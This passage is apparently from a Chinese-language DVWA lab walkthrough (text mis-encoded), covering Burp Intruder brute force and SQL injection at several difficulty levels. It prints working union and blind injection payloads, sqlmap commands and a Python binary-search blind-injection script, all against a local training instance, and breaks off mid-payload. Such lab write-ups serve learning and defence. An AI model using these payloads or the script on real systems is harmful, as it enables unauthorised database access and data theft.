alt="intr3-1.png"></p><p>2.æ”»å‡»ç±»å‹é€‰æ‹©pitchforkï¼Œæ„æ€æ˜¯è‰å‰æ¨¡å¼ï¼ˆPitchfork ï¼‰â€”â€”å®ƒå¯ä»¥ä½¿ç”¨å¤šç»„Payloadé›†åˆï¼Œåœ¨æ¯ä¸€ä¸ªä¸åŒçš„Payloadæ ‡å¿—ä½ç½®ä¸Šï¼ˆæœ€å¤š20ä¸ªï¼‰ï¼Œéå†æ‰€æœ‰çš„Payloadã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªPayloadæ ‡å¿—ä½ç½®ï¼Œç¬¬ä¸€ä¸ªPayloadå€¼ä¸ºAå’ŒBï¼Œç¬¬äºŒä¸ªPayloadå€¼ä¸ºCå’ŒDï¼Œåˆ™å‘èµ·æ”»å‡»æ—¶ï¼Œå°†å…±å‘èµ·ä¸¤æ¬¡æ”»å‡»ï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºAå’ŒCï¼Œç¬¬äºŒæ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºBå’ŒDã€‚</p><p><img src="https://i.loli.net/2020/11/05/tr4dB1SzEHxY9UD.png" srcset="/img/loading.gif" alt="intr3-2.png"></p><p>3.è®¾ç½®å‚æ•°ï¼Œåœ¨optioné€‰é¡¹å¡ä¸­å°†æ”»å‡»çº¿ç¨‹threadè®¾ç½®ä¸º1ï¼Œå› ä¸ºRecursive_Grepæ¨¡å¼ä¸æ”¯æŒå¤šçº¿ç¨‹æ”»å‡»ï¼Œç„¶åé€‰æ‹©Grep-Extractï¼Œæ„æ€æ˜¯ç”¨äºæå–å“åº”æ¶ˆæ¯ä¸­çš„æœ‰ç”¨ä¿¡æ¯ï¼Œç‚¹å‡»Addï¼Œå¦‚ä¸‹å›¾è¿›è¡Œè®¾ç½®ï¼Œæœ€åå°†Redirectionsè®¾ç½®ä¸ºAlways</p><p><img src="https://i.loli.net/2020/11/05/d5qmsRVpu3kZ7Gr.png" srcset="/img/loading.gif" alt="intr3-3.png"></p><p>4.è®¾ç½®payloadï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯†ç ä¸ä¹‹å‰ä¸¤æ¬¡ä¸€æ ·ï¼ŒåŠ è½½å¯†ç å­—å…¸å³å¯ï¼Œç¬¬äºŒtokenå‚æ•°é€‰æ‹©Recursive grepï¼Œç„¶åå°†optionsä¸­çš„tokenä½œä¸ºç¬¬ä¸€æ¬¡è¯·æ±‚çš„åˆå§‹å€¼ã€‚</p><p><img src="https://i.loli.net/2020/11/05/cQdZAUqgMDO4eJI.png" srcset="/img/loading.gif" alt="intr3-4.png"></p><p>5.start attack,è¿˜æ˜¯æ ¹æ®å“åº”åŒ…é•¿åº¦çš„ä¸åŒæ‰¾åˆ°åŒ…å«çœŸæ­£å¯†ç çš„è¯·æ±‚åŒ…ï¼Œè·å–æ­£ç¡®å¯†ç ã€‚</p><p><img src="https://i.loli.net/2020/11/05/tpMjbBah95clPK8.png" srcset="/img/loading.gif" alt="intr3-5.png"></p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_SESSION [ <span class="hljs-string">'id'</span> ] ) ) &#123;    <span class="hljs-comment">// Get input</span>    $id = $_SESSION[ <span class="hljs-string">'id'</span> ];    <span class="hljs-comment">// Check database</span>    $query  = <span class="hljs-string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>], $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );    <span class="hljs-comment">// Get results</span>    <span class="hljs-keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;        <span class="hljs-comment">// Get values</span>        $first = $row[<span class="hljs-string">"first_name"</span>];        $last  = $row[<span class="hljs-string">"last_name"</span>];        <span class="hljs-comment">// Feedback for end user</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-keyword">false</span> : $___mysqli_res);        &#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;</code>æ³¨å…¥ç‚¹å°±åœ¨è¿™å¥ä»£ç ä¸­</p><h4 id="æ‰‹å·¥æ³¨å…¥"><a href="#æ‰‹å·¥æ³¨å…¥" class="headerlink" title="æ‰‹å·¥æ³¨å…¥"></a>æ‰‹å·¥æ³¨å…¥</h4><h5 id="1-åˆ¤æ–­æ³¨å…¥ç±»å‹"><a href="#1-åˆ¤æ–­æ³¨å…¥ç±»å‹" class="headerlink" title="1.åˆ¤æ–­æ³¨å…¥ç±»å‹"></a>1.åˆ¤æ–­æ³¨å…¥ç±»å‹</h5><div class="hljs"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #<span class="hljs-number">1</span><span class="hljs-comment">' or 1=1 #</span></code></pre></div><p>å¯çŸ¥æ˜¯å­—ç¬¦å‹æ³¨å…¥</p><h5 id="2-åˆ¤æ–­å¤šå°‘å­—æ®µæ•°"><a href="#2-åˆ¤æ–­å¤šå°‘å­—æ®µæ•°" class="headerlink" title="2.åˆ¤æ–­å¤šå°‘å­—æ®µæ•°"></a>2.åˆ¤æ–­å¤šå°‘å­—æ®µæ•°</h5><div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">#</span></code></pre></div><p>æŠ¥é”™</p><div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment">#</span></code></pre></div><p>æ˜¾ç¤ºæ­£å¸¸ï¼Œè¯´æ˜åªæœ‰2ä¸ªå­—æ®µ</p><h5 id="3-ç¡®è®¤æ˜¾ç¤ºé¡ºåº"><a href="#3-ç¡®è®¤æ˜¾ç¤ºé¡ºåº" class="headerlink" title="3.ç¡®è®¤æ˜¾ç¤ºé¡ºåº"></a>3.ç¡®è®¤æ˜¾ç¤ºé¡ºåº</h5><p><img src="https://i.loli.net/2020/11/06/isw8SKDdjWlv5AJ.png" srcset="/img/loading.gif" alt="sqll-2.png"></p><p>ä¸¤ä¸ªä½ç½®éƒ½å¯ä»¥ä½¿ç”¨</p><h5 id="4-unionæŸ¥è¯¢"><a href="#4-unionæŸ¥è¯¢" class="headerlink" title="4.unionæŸ¥è¯¢"></a>4.unionæŸ¥è¯¢</h5><div class="hljs"><pre><code class="hljs sql">1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#</span></code></pre></div><p><img src="https://i.loli.net/2020/11/06/mudnW957ZotUhNM.png" srcset="/img/loading.gif" alt="sqll-3.png"></p><div class="hljs"><pre><code class="hljs sql">1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'flag'</span> <span class="hljs-comment">#</span></code></pre></div><p><img src="https://i.loli.net/2020/11/06/UtxVjBMkiGb534Z.png" srcset="/img/loading.gif" alt="sqll-4.png"></p><div class="hljs"><pre><code class="hljs sql">1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(fl4g) <span class="hljs-keyword">from</span> flag <span class="hljs-comment">#</span></code></pre></div><p><img src="https://i.loli.net/2020/11/06/BNp8ZiPgy2MdHvC.png" srcset="/img/loading.gif" alt="sqll-1.png"></p><h4 id="sqlmapæ³¨å…¥"><a href="#sqlmapæ³¨å…¥" class="headerlink" title="sqlmapæ³¨å…¥"></a>sqlmapæ³¨å…¥</h4><div class="hljs"><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">"security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1"</span> <span class="hljs-params">--batch</span> <span class="hljs-params">--dbs</span>python2 sqlmap.py -u <span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">"security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1"</span> <span class="hljs-params">--batch</span> -D dvwa -T flag <span class="hljs-params">--columns</span>python2 sqlmap.py -u <span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">"security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1"</span> <span class="hljs-params">--batch</span> -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span></code></pre></div><p><img src="https://i.loli.net/2020/11/06/f87DeH6rKI2JhzY.png" srcset="/img/loading.gif" alt="sqll-5.png"></p><h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><p>ä¸lowçº§åˆ«ç›¸æ¯”è¾ƒï¼Œè¿™é‡Œçš„idå€¼ä¸éœ€è¦ç”¨æˆ·è¾“å…¥ï¼Œåªéœ€è¦é€‰æ‹©ï¼Œä½†æ˜¯å¯ä»¥æŠ“åŒ…ä¿®æ”¹idçš„å†…å®¹</p><p><img src="https://i.loli.net/2020/11/05/VTtp9QbyDe1Gsg8.png" srcset="/img/loading.gif" alt="sqlm-1.png"></p><h4 id="æ‰‹å·¥æ³¨å…¥-1"><a href="#æ‰‹å·¥æ³¨å…¥-1" class="headerlink" title="æ‰‹å·¥æ³¨å…¥"></a>æ‰‹å·¥æ³¨å…¥</h4><p>ç»è¿‡æµ‹è¯•æ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œå¾ˆç®€å•çš„åˆ¤æ–­å°±ä¸æˆªå›¾äº†</p><h5 id="1-åˆ¤æ–­åˆ—æ•°"><a href="#1-åˆ¤æ–­åˆ—æ•°" class="headerlink" title="1.åˆ¤æ–­åˆ—æ•°"></a>1.åˆ¤æ–­åˆ—æ•°</h5><div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-attr">id=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-comment">#&amp;Submit=Submit</span></code></pre></div><p><img src="https://i.loli.net/2020/11/05/GuUbcedZETzJ7qw.png" srcset="/img/loading.gif" alt="sqlm-2.png"></p><p>æ­¤æ—¶é¡µé¢æ­£å¸¸</p><div class="hljs"><pre><code class="hljs angelscript">id=<span class="hljs-number">1</span> order by <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#&amp;Submit=Submit</code></pre></div><p>æ­¤æ—¶é¡µé¢æŠ¥é”™</p><p><code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code></p><p>æ‰€ä»¥å¯çŸ¥ä¸ºä¸¤åˆ—ï¼Œä¹‹åçš„æ“ä½œä¸lowçº§åˆ«çš„ä¸€æ ·</p><h5 id="2-unionæŸ¥è¯¢"><a href="#2-unionæŸ¥è¯¢" class="headerlink" title="2.unionæŸ¥è¯¢"></a>2.unionæŸ¥è¯¢</h5><div class="hljs"><pre><code class="hljs sql">çˆ†æ•°æ®åº“åid=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#&amp;Submit=Submit</span>çˆ†åˆ—å<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-number">0x666c6167</span> <span class="hljs-comment">#&amp;Submit=Submit</span>è¯»å–flag<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(fl4g) <span class="hljs-keyword">from</span> flag <span class="hljs-comment">#&amp;Submit=Submit</span></code></pre></div><p>è¿™é‡Œè¯»å–åˆ—åçš„æ—¶å€™éœ€è¦æ³¨æ„ä½¿ç”¨åˆ—åçš„åå…­è¿›åˆ¶ï¼Œä¸ç„¶å°±ä¼šæŠ¥é”™ï¼Œåº”è¯¥æ˜¯ <code>&#39;</code>è¢« <code>\</code>è½¬ä¹‰äº†ï¼Œå¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶ç»•è¿‡</p><p><img src="https://i.loli.net/2020/11/05/OlNHhc4Zy9KnsYS.png" srcset="/img/loading.gif" alt="sqlm-3.png"></p><p><img src="https://i.loli.net/2020/11/05/zM1eE3plignbySf.png" srcset="/img/loading.gif" alt="sqlm-4.png"></p><p><strong>åˆ†ææºç </strong></p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'Submit'</span> ] ) ) &#123;    <span class="hljs-comment">// Get input</span>    $id = $_POST[ <span class="hljs-string">'id'</span> ];    $id = mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>], $id);    $query  = <span class="hljs-string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>], $query) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) . <span class="hljs-string">'&lt;/pre&gt;'</span> );    <span class="hljs-comment">// Get results</span>    <span class="hljs-keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;        <span class="hljs-comment">// Display values</span>        $first = $row[<span class="hljs-string">"first_name"</span>];        $last  = $row[<span class="hljs-string">"last_name"</span>];        <span class="hljs-comment">// Feedback for end user</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;    &#125;&#125;<span class="hljs-comment">// This is used later on in the index.php page</span><span class="hljs-comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span>$query  = <span class="hljs-string">"SELECT COUNT(*) FROM users;"</span>;$result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );$number_of_rows = mysqli_fetch_row( $result )[<span class="hljs-number">0</span>];mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]);<span class="hljs-meta">?&gt;</span></code></pre></div><p><code>mysqli_real_escape_string()</code> å‡½æ•°è½¬ä¹‰åœ¨ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚</p><p>æ‰€ä»¥å¯¼è‡´äº†å•å¼•å·è¢«è½¬ä¹‰çš„ç»“æœ</p><h4 id="sqlmapæ³¨å…¥-1"><a href="#sqlmapæ³¨å…¥-1" class="headerlink" title="sqlmapæ³¨å…¥"></a>sqlmapæ³¨å…¥</h4><p>å› ä¸ºæ˜¯postæ³¨å…¥ï¼Œæ‰€ä»¥éœ€è¦æŠ“å–æ•°æ®åŒ…ä¿å­˜ä¸‹æ¥ã€‚</p><p>å¦‚å›¾ï¼Œå¯ä»¥å°†å…¶ä¿å­˜åœ¨sqlmap.pyçš„è·¯å¾„ä¸‹</p><p><img src="https://i.loli.net/2020/11/06/hySBmFe4zoTgvNq.png" srcset="/img/loading.gif" alt="sqlm-5.png"></p><h5 id="æ³¨å…¥è¿‡ç¨‹"><a href="#æ³¨å…¥è¿‡ç¨‹" class="headerlink" title="æ³¨å…¥è¿‡ç¨‹"></a>æ³¨å…¥è¿‡ç¨‹</h5><div class="hljs"><pre><code class="hljs stylus">python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch --dbspython2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa --tablespython2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa -T flag --<span class="hljs-attribute">columns</span>python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa -T flag -C fl4g --dump</code></pre></div><p><img src="https://i.loli.net/2020/11/06/zaHYUItEZlPFh4e.png" srcset="/img/loading.gif" alt="sqlm-6.png"></p><h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p>è¿™æ¬¡ç”¨æˆ·è¾“å…¥ä¸å›æ˜¾ä¸åœ¨åŒä¸€ä¸ªé¡µé¢ï¼Œè¿™åªè¦æ˜¯ä¸ºäº†é˜²æ­¢sqlmapè¿™ç§è‡ªåŠ¨åŒ–æ³¨å…¥å·¥å…·çš„æ”»å‡»</p><p><img src="https://i.loli.net/2020/11/06/kAdfp8SFCroTlID.png" srcset="/img/loading.gif" alt="sqlh-1.png"></p><h4 id="æ³¨å…¥"><a href="#æ³¨å…¥" class="headerlink" title="æ³¨å…¥"></a>æ³¨å…¥</h4><p>ç›´æ¥ä½¿ç”¨lowçº§åˆ«çš„payloadï¼š</p><div class="hljs"><pre><code class="hljs sql">1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#</span><span class="hljs-number">1</span><span class="hljs-string">' union select 1,group_concat(column_name) from information_schema.columns where table_name='</span>flag<span class="hljs-string">' #</span><span class="hljs-string">1'</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(fl4g) <span class="hljs-keyword">from</span> flag <span class="hljs-comment">#</span></code></pre></div><p><img src="https://i.loli.net/2020/11/06/4sjoOwYKa3lW6S1.png" srcset="/img/loading.gif" alt="sqlh-2.png"></p><p><img src="https://i.loli.net/2020/11/06/vXlbSQk1cn2JTAB.png" srcset="/img/loading.gif" alt="sqlh-3.png"></p><p><img src="https://i.loli.net/2020/11/06/IohbvktCq2NpyDa.png" srcset="/img/loading.gif" alt="sqlh-4.png"></p><p>æºç åˆ†æ</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_SESSION [ <span class="hljs-string">'id'</span> ] ) ) &#123;    <span class="hljs-comment">// Get input</span>    $id = $_SESSION[ <span class="hljs-string">'id'</span> ];    <span class="hljs-comment">// Check database</span>    $query  = <span class="hljs-string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>], $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );    <span class="hljs-comment">// Get results</span>    <span class="hljs-keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;        <span class="hljs-comment">// Get values</span>        $first = $row[<span class="hljs-string">"first_name"</span>];        $last  = $row[<span class="hljs-string">"last_name"</span>];        <span class="hljs-comment">// Feedback for end user</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-keyword">false</span> : $___mysqli_res);        &#125;<span class="hljs-meta">?&gt;</span></code></pre></div><div class="hljs"><pre><code class="hljs sql">$query  = "<span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'$id'</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">1</span>;";</code></pre></div><p>å­˜åœ¨æ³¨å…¥çš„è¯­å¥åªæ˜¯åœ¨lowçº§åˆ«çš„åŸºç¡€ä¸ŠåŠ ä¸Šäº†<code>Limit</code>é™åˆ¶äº†å›æ˜¾çš„è¡Œæ•°ï¼Œä½†æ˜¯ä½¿ç”¨lowçº§åˆ«çš„æ³¨å…¥è¯­å¥æ—¶ä¼šç›´æ¥æŠŠ<code>Limit 1</code>æ³¨é‡Šæ‰ï¼Œæ‰€ä»¥å®Œå…¨ä¸lowçº§åˆ«ä¸€æ ·ã€‚</p><h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><p>ç›²æ³¨çš„è¿‡ç¨‹ï¼Œå°±åƒä½ ä¸ä¸€ä¸ªæœºå™¨äººèŠå¤©ï¼Œè¿™ä¸ªæœºå™¨äººçŸ¥é“çš„å¾ˆå¤šï¼Œä½†åªä¼šå›ç­”â€œæ˜¯â€æˆ–è€…â€œä¸æ˜¯â€ï¼Œå› æ­¤ä½ éœ€è¦è¯¢é—®å®ƒè¿™æ ·çš„é—®é¢˜ï¼Œä¾‹å¦‚â€œæ•°æ®åº“åå­—çš„ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯ä¸æ˜¯aå•Šï¼Ÿâ€ï¼Œé€šè¿‡è¿™ç§æœºæ¢°çš„è¯¢é—®ï¼Œæœ€ç»ˆè·å¾—ä½ æƒ³è¦çš„æ•°æ®ã€‚</p><h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><h4 id="æ‰‹å·¥åŠ è„šæœ¬"><a href="#æ‰‹å·¥åŠ è„šæœ¬" class="headerlink" title="æ‰‹å·¥åŠ è„šæœ¬"></a>æ‰‹å·¥åŠ è„šæœ¬</h4><p>æŸ¥è¯¢æˆåŠŸè¿”å›çš„è¯­å¥ï¼šUser ID exists in the database.</p><p>æŸ¥è¯¢å¤±è´¥è¿”å›çš„è¯­å¥ï¼šUser ID is MISSING from the database.</p><p>è¿™æ ·å°±å¯ä»¥åˆ©ç”¨æç¤ºä¿¡æ¯ç¡®å®šï¼Œæˆ‘ä»¬æ‰€æŸ¥è¯¢çš„è¯­å¥æ˜¯å¦æ­£ç¡®</p><p>é¦–å…ˆç¡®å®šç›²æ³¨çš„è¯­å¥</p><p>é€šè¿‡ä¸‹é¢çš„æµ‹è¯•ï¼Œè¯´æ˜asciiå‡½æ•°æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œå†™æ³¨å…¥çš„è„šæœ¬ï¼ŒäºŒåˆ†æ³•æ›´å¿«ç‚¹ã€‚</p><div class="hljs"><pre><code class="hljs routeros">1<span class="hljs-string">' and ascii(substring(database(),1,1))&gt;50 #</span><span class="hljs-string">æç¤º ï¼šUser ID exists in the database.</span><span class="hljs-string">1'</span> <span class="hljs-keyword">and</span> ascii(substring(database(),1,1))&lt;50 #æç¤ºï¼š<span class="hljs-built_in"> User </span>ID is MISSING <span class="hljs-keyword">from</span> the database.</code></pre></div><p><img src="https://i.loli.net/2020/12/08/nyQJR3ZHDYW87wt.png" srcset="/img/loading.gif" alt="image-20201026201632666"></p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2020/10/26 17:29</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : dvwa.py</span><span class="hljs-comment"># äºŒåˆ†æ³•ç›²æ³¨</span><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id="</span>header = &#123;<span class="hljs-string">"Cookie"</span>: <span class="hljs-string">"security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1"</span>&#125;flag = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    left = <span class="hljs-number">32</span>    right = <span class="hljs-number">128</span>    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(left &lt; right):        <span class="hljs-comment">#è·å–æ•°æ®åº“å</span>        <span class="hljs-comment">#payload = "1' and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23".format(i,mid)</span>        <span class="hljs-comment">#è·å–è¡¨å</span>        <span class="hljs-comment">#payload = "1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23".format(i,mid)</span>        <span class="hljs-comment">#è·å–åˆ—å</span>        <span class="hljs-comment">#payload = "1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='flag' having a&gt;&#123;1&#125;)%23".format(i,mid)</span>        <span class="hljs-comment">#è·å–flag</span>        payload = <span class="hljs-string">"1' and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23"</span>.format(i,mid)        url1 =url+payload+<span class="hljs-string">"&amp;Submit=Submit#"</span>        response = requests.post(url1,headers= header)        <span class="hljs-keyword">if</span> <span class="hljs-string">"exists"</span> <span class="hljs-keyword">in</span> response.text:            left = mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            right = mid        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>    flag = flag + chr(mid)print(flag)</code></pre></div><p>1.é¦–å…ˆè·å–è¡¨å</p><p>ä½¿ç”¨payload:</p><div class="hljs"><pre><code class="hljs sql">payload = "1' and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substring</span>(<span class="hljs-keyword">group_concat</span>(table_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">".format(i,mid)</span></code></pre></div><p><img src="https://i.loli.net/2020/11/06/YfAIjUFeiEodHML.png" srcset="/img/loading.gif" alt="bsqll-1.png"></p><p>2.è·å–åˆ—å</p><p>ä½¿ç”¨payload</p><div class="hljs"><pre><code class="hljs sql">payload = "1' and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substring</span>(<span class="hljs-keyword">group_concat</span>(column_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">'flag'</span> <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">".format(i,mid)</span></code></pre></div><p><img src="https://i.loli.net/2020/11/06/AoaD41sLJ5wmbeG.png" srcset="/img/loading.gif" alt="bsqll-2.png"></p><p>3.è·å–flag</p><p>ä½¿ç”¨payload</p><div class="hljs"><pre><code class="hljs sql">payload = "1' and (<span class="hljs-keyword">select</span> <span 